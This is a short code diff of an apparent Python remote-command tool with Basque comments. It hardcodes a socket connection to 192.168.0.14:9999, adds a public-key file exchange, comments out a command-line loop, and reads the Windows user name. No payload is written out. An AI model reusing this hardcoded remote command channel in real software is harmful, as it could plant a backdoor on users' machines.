@@ -32,6 +32,19 @@ class server(object):
           stri = str(hartuta,encoding='utf-8')   
           print(stri)
 
+    def getPuKey(self):
+        keyP =  self.soc.recv(1024)
+        clientKey = open(f'pUcliente.pem','w')
+        for x in keyP.splitlines():
+            clientKey.write(f'{str(x,"utf-8")}\n')
+    
+    def postPuKey(self):
+        url = os.getcwd()
+        filBT = None
+        with open('pUserver.pem', "rb") as key_file:
+           filBT = key_file.read()
+        self.soc.send(filBT)
+
     def koneksioa(self):
       while True:
           user = win32api.GetUserName()
@@ -141,8 +154,12 @@ class server(object):
       self.soc.close()#tcp koneksioa amaitu
 
 ser = server("192.168.0.14",9999,1)
-while True:
-    ser.comandLine()
+ser.getPuKey()
+ser.postPuKey()
+#while True:
+  # comand =  ser.comandLine()
+
+
 
 
 
